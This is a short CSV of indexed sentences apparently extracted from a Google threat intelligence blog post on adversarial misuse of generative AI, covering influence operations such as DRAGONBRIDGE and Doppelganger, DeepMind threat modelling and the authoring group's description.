CAND_02494,R050,44,R050_P0001,R050_S000255,DRAGONBRIDGE's use of AI-generated videos or images has not resulted in significantly higher engagement from real viewers.
CAND_02495,R050,45,R050_P0001,R050_S000260,We also observed usage by actors tracked publicly as Doppelganger.
CAND_02496,R050,48,R050_P0001,R050_S000282,"Google DeepMind also develops threat models for generative AI to identify potential vulnerabilities, and creates new evaluation and training techniques to address misuse caused by them."
CAND_02497,R050,48,R050_P0001,R050_S000286,"As innovation moves forward, the industry needs security standards for building and deploying AI responsibly."
CAND_02498,R050,48,R050_P0001,R050_S000290,"Contact sales Get started for free Cloud Blog 10/6/26, 10:34 AM Adversarial Misuse of Generative AI | Google Cloud Blog https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?utm_source=chatgpt.com 50/52"
CAND_02499,R050,49,R050_P0001,R050_S000291,"Related articles Threat Intelligence By Google Threat Intelligence Group • 17- minute read Threat Intelligence By Mandiant • 29-minute read About the Authors Google Threat Intelligence Group brings together the Mandiant Intelligence and Threat Analysis Group (TAG) teams, and focuses on identifying, analyzing, mitigating, and eliminating entire classes of cyber threats against Alphabet, our users, and our customers."
CAND_02500,R050,49,R050_P0001,R050_S000293,We apply our intelligence to improve Google's defenses and protect our users and customers.
